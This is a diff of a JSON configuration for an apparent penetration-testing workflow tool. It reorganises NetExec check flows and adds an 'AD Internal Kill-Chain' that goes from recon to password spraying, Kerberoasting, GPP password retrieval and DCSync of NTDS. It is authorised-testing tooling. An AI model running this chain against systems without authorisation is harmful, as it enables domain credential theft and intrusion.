+              "y": 1560
+            }
+          },
+          {
+            "checklist_item_name": "NXC MSSQL Null Auth (batch)",
+            "order_index": 14,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 1680
+            }
+          },
+          {
+            "checklist_item_name": "NXC MSSQL Null Auth",
+            "order_index": 15,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 1800
+            }
+          },
+          {
+            "checklist_item_name": "NXC SSH Guest Auth (batch)",
+            "order_index": 16,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 1920
+            }
+          },
+          {
+            "checklist_item_name": "NXC SSH Guest Auth",
+            "order_index": 17,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 2040
+            }
+          },
+          {
+            "checklist_item_name": "NXC SSH Null Auth (batch)",
+            "order_index": 18,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 2160
+            }
+          },
+          {
+            "checklist_item_name": "NXC SSH Null Auth",
+            "order_index": 19,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 2280
+            }
+          },
+          {
+            "checklist_item_name": "NXC FTP Guest Auth (batch)",
+            "order_index": 20,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 2400
+            }
+          },
+          {
+            "checklist_item_name": "NXC FTP Guest Auth",
+            "order_index": 21,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 2520
+            }
+          },
+          {
+            "checklist_item_name": "NXC FTP Null Auth (batch)",
+            "order_index": 22,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 2640
+            }
+          },
+          {
+            "checklist_item_name": "NXC FTP Null Auth",
+            "order_index": 23,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 2760
+            }
+          },
+          {
+            "checklist_item_name": "NXC WMI Guest Auth (batch)",
+            "order_index": 24,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 2880
+            }
+          },
+          {
+            "checklist_item_name": "NXC WMI Guest Auth",
+            "order_index": 25,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 3000
+            }
+          },
+          {
+            "checklist_item_name": "NXC WMI Null Auth (batch)",
+            "order_index": 26,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 3120
+            }
+          },
+          {
+            "checklist_item_name": "NXC WMI Null Auth",
+            "order_index": 27,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 3240
             }
           }
         ]
@@ -3842,7 +5464,7 @@
         "name": "DNS Enumeration Flow",
         "description": "Sequential execution of all DNS Enumeration items",
         "is_default_import": true,
-        "requires_auth": true,
+        "requires_auth": false,
         "tags": [
           "auto",
           "dns-enumeration"
@@ -3980,6 +5602,34 @@
             {
               "source": 5,
               "target": 6
+            },
+            {
+              "source": 6,
+              "target": 7
+            },
+            {
+              "source": 7,
+              "target": 8
+            },
+            {
+              "source": 8,
+              "target": 9
+            },
+            {
+              "source": 9,
+              "target": 10
+            },
+            {
+              "source": 10,
+              "target": 11
+            },
+            {
+              "source": 11,
+              "target": 12
+            },
+            {
+              "source": 12,
+              "target": 13
             }
           ]
         },
@@ -3997,7 +5647,7 @@
             }
           },
           {
-            "checklist_item_name": "NXC RDP Auth (batch)",
+            "checklist_item_name": "NXC SMB Auth",
             "order_index": 1,
             "input_mapping": {},
             "condition": null,
@@ -4005,67 +5655,151 @@
             "timeout_override": null,
             "ui_position": {
               "x": 250,
-              "y": 117.05024912766066
+              "y": 120
             }
           },
           {
-            "checklist_item_name": "NXC WINRM Auth (batch)",
+            "checklist_item_name": "NXC RDP Auth (batch)",
             "order_index": 2,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 253.4152708575648,
-              "y": 239.22340454166874
+              "x": 250,
+              "y": 240
             }
           },
           {
-            "checklist_item_name": "NXC MSSQL Auth (batch)",
+            "checklist_item_name": "NXC RDP Auth",
             "order_index": 3,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 255.12290628634742,
-              "y": 361.39655995567693
+              "x": 250,
+              "y": 360
             }
           },
           {
-            "checklist_item_name": "NXC SSH Auth (batch)",
+            "checklist_item_name": "NXC WINRM Auth (batch)",
             "order_index": 4,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 258.53817714391243,
-              "y": 490.40025708481494
+              "x": 250,
+              "y": 480
             }
           },
           {
-            "checklist_item_name": "NXC FTP Auth (batch)",
+            "checklist_item_name": "NXC WINRM Auth",
             "order_index": 5,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 258,
-              "y": 608.0000000000001
+              "x": 250,
+              "y": 600
             }
           },
           {
-            "checklist_item_name": "NXC WMI Auth (batch)",
+            "checklist_item_name": "NXC MSSQL Auth (batch)",
             "order_index": 6,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 270,
-              "y": 726
+              "x": 250,
+              "y": 720
+            }
+          },
+          {
+            "checklist_item_name": "NXC MSSQL Auth",
+            "order_index": 7,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 840
+            }
+          },
+          {
+            "checklist_item_name": "NXC SSH Auth (batch)",
+            "order_index": 8,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 960
+            }
+          },
+          {
+            "checklist_item_name": "NXC SSH Auth",
+            "order_index": 9,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 1080
+            }
+          },
+          {
+            "checklist_item_name": "NXC FTP Auth (batch)",
+            "order_index": 10,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 1200
+            }
+          },
+          {
+            "checklist_item_name": "NXC FTP Auth",
+            "order_index": 11,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 1320
+            }
+          },
+          {
+            "checklist_item_name": "NXC WMI Auth (batch)",
+            "order_index": 12,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 1440
+            }
+          },
+          {
+            "checklist_item_name": "NXC WMI Auth",
+            "order_index": 13,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 1560
             }
           }
         ]
@@ -5481,37 +7215,154 @@
             }
           }
         ]
+      },
+      {
+        "name": "AD Internal Kill-Chain",
+        "description": "Staged internal AD pipeline: recon -> unauth checks -> BloodHound -> roasting -> password spray -> secrets. Provide {username}/{password}/{domain}/{pdcip}.",
+        "is_default_import": false,
+        "requires_auth": true,
+        "tags": [
+          "methodology",
+          "active-directory",
+          "internal"
+        ],
+        "flow_definition": {},
+        "steps": [
+          {
+            "checklist_item_name": "Nmap Ping Sweep",
+            "order_index": 0,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 120,
+              "y": 100
+            }
+          },
+          {
+            "checklist_item_name": "NXC SMB Null Auth",
+            "order_index": 1,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 440,
+              "y": 230
+            }
+          },
+          {
+            "checklist_item_name": "NXC SMB gen-relay-list (scope)",
+            "order_index": 1,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 120,
+              "y": 230
+            }
+          },
+          {
+            "checklist_item_name": "NXC LDAP BloodHound",
+            "order_index": 2,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 440,
+              "y": 360
+            }
+          },
+          {
+            "checklist_item_name": "NXC LDAP ASREPRoast",
+            "order_index": 3,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 120,
+              "y": 490
+            }
+          },
+          {
+            "checklist_item_name": "NXC LDAP Kerberoast",
+            "order_index": 3,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 440,
+              "y": 490
+            }
+          },
+          {
+            "checklist_item_name": "NXC SMB Password Policy",
+            "order_index": 4,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 120,
+              "y": 620
+            }
+          },
+          {
+            "checklist_item_name": "NXC SMB Password Spray",
+            "order_index": 5,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 440,
+              "y": 750
+            }
+          },
+          {
+            "checklist_item_name": "NXC SMB GPP Passwords",
+            "order_index": 6,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 120,
+              "y": 880
+            }
+          },
+          {
+            "checklist_item_name": "NXC SMB DCSync (NTDS)",
+            "order_index": 6,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "ui_position": {
+              "x": 440,
+              "y": 880
+            }
+          }
+        ]
       }
     ]
   },
   "variables": {
     "variables": [
       {
-        "key": "adminpassword",
+        "key": "scope",
         "value": "",
-        "var_type": "string",
-        "description": "Privileged/local admin password",
-        "is_default_import": false
+        "var_type": "file",
+        "description": "Project scope (CIDR/IP list)",
+        "is_default_import": true
       },
       {
-        "key": "adminuser",
+        "key": "targets",
         "value": "",
-        "var_type": "string",
-        "description": "Privileged/local admin username",
-        "is_default_import": false
+        "var_type": "file",
+        "description": "Alive targets list file",
+        "is_default_import": true
       },
       {
-        "key": "ca_name",
+        "key": "target",
         "value": "",
         "var_type": "string",
-        "description": "ADCS CA name",
-        "is_default_import": false
-      },
-      {
-        "key": "community",
-        "value": "public",
-        "var_type": "string",
-        "description": "SNMP community string",
+        "description": "Single target IP",
         "is_default_import": true
       },
       {
@@ -5536,87 +7387,17 @@
         "is_default_import": true
       },
       {
-        "key": "domainsid",
+        "key": "username",
         "value": "",
         "var_type": "string",
-        "description": "Domain SID",
-        "is_default_import": false
-      },
-      {
-        "key": "domainusersfile",
-        "value": "",
-        "var_type": "file",
-        "description": "Valid domain users file",
+        "description": "Domain username",
         "is_default_import": true
-      },
-      {
-        "key": "domusers",
-        "value": "",
-        "var_type": "file",
-        "description": "Domain users wordlist",
-        "is_default_import": true
-      },
-      {
-        "key": "hash",
-        "value": "",
-        "var_type": "string",
-        "description": "NTLM hash for PtH",
-        "is_default_import": true
-      },
-      {
-        "key": "interface",
-        "value": "",
-        "var_type": "string",
-        "description": "Network interface (e.g. eth0)",
-        "is_default_import": true
-      },
-      {
-        "key": "listener",
-        "value": "",
-        "var_type": "string",
-        "description": "Attacker listener IP",
-        "is_default_import": true
-      },
-      {
-        "key": "localpass",
-        "value": "",
-        "var_type": "string",
-        "description": "Local admin password",
-        "is_default_import": false
-      },
-      {
-        "key": "localuser",
-        "value": "",
-        "var_type": "string",
-        "description": "Local admin username",
-        "is_default_import": false
-      },
-      {
-        "key": "newpassword",
-        "value": "",
-        "var_type": "string",
-        "description": "New password for reset",
-        "is_default_import": false
       },
       {
         "key": "password",
         "value": "",
         "var_type": "string",
         "description": "Domain password",
-        "is_default_import": true
-      },
-      {
-        "key": "passwordsfile",
-        "value": "",
-        "var_type": "file",
-        "description": "Passwords wordlist",
-        "is_default_import": true
-      },
-      {
-        "key": "pdcfqdn",
-        "value": "",
-        "var_type": "string",
-        "description": "Primary DC FQDN",
         "is_default_import": true
       },
       {
@@ -5627,10 +7408,59 @@
         "is_default_import": true
       },
       {
-        "key": "scope",
+        "key": "pdcfqdn",
+        "value": "",
+        "var_type": "string",
+        "description": "Primary DC FQDN",
+        "is_default_import": true
+      },
+      {
+        "key": "hash",
+        "value": "",
+        "var_type": "string",
+        "description": "NTLM hash for PtH",
+        "is_default_import": true
+      },
+      {
+        "key": "listener",
+        "value": "",
+        "var_type": "string",
+        "description": "Attacker listener IP",
+        "is_default_import": true
+      },
+      {
+        "key": "interface",
+        "value": "",
+        "var_type": "string",
+        "description": "Network interface (e.g. eth0)",
+        "is_default_import": true
+      },
+      {
+        "key": "domusers",
         "value": "",
         "var_type": "file",
-        "description": "Project scope (CIDR/IP list)",
+        "description": "Domain users wordlist",
+        "is_default_import": true
+      },
+      {
+        "key": "domainusersfile",
+        "value": "",
+        "var_type": "file",
+        "description": "Valid domain users file",
+        "is_default_import": true
+      },
+      {
+        "key": "passwordsfile",
+        "value": "",
+        "var_type": "file",
+        "description": "Passwords wordlist",
+        "is_default_import": true
+      },
+      {
+        "key": "community",
+        "value": "public",
+        "var_type": "string",
+        "description": "SNMP community string",
         "is_default_import": true
       },
       {
@@ -5641,10 +7471,31 @@
         "is_default_import": true
       },
       {
-        "key": "targetuser",
+        "key": "localuser",
         "value": "",
         "var_type": "string",
-        "description": "Target user for attacks",
+        "description": "Local admin username",
+        "is_default_import": false
+      },
+      {
+        "key": "localpass",
+        "value": "",
+        "var_type": "string",
+        "description": "Local admin password",
+        "is_default_import": false
+      },
+      {
+        "key": "domainsid",
+        "value": "",
+        "var_type": "string",
+        "description": "Domain SID",
+        "is_default_import": false
+      },
+      {
+        "key": "ca_name",
+        "value": "",
+        "var_type": "string",
+        "description": "ADCS CA name",
         "is_default_import": false
       },
       {
@@ -5655,11 +7506,32 @@
         "is_default_import": false
       },
       {
-        "key": "username",
+        "key": "targetuser",
         "value": "",
         "var_type": "string",
-        "description": "Domain username",
-        "is_default_import": true
+        "description": "Target user for attacks",
+        "is_default_import": false
+      },
+      {
+        "key": "newpassword",
+        "value": "",
+        "var_type": "string",
+        "description": "New password for reset",
+        "is_default_import": false
+      },
+      {
+        "key": "adminuser",
+        "value": "",
+        "var_type": "string",
+        "description": "Privileged/local admin username",
+        "is_default_import": false
+      },
+      {
+        "key": "adminpassword",
+        "value": "",
+        "var_type": "string",
+        "description": "Privileged/local admin password",
+        "is_default_import": false
       }
     ]
   }
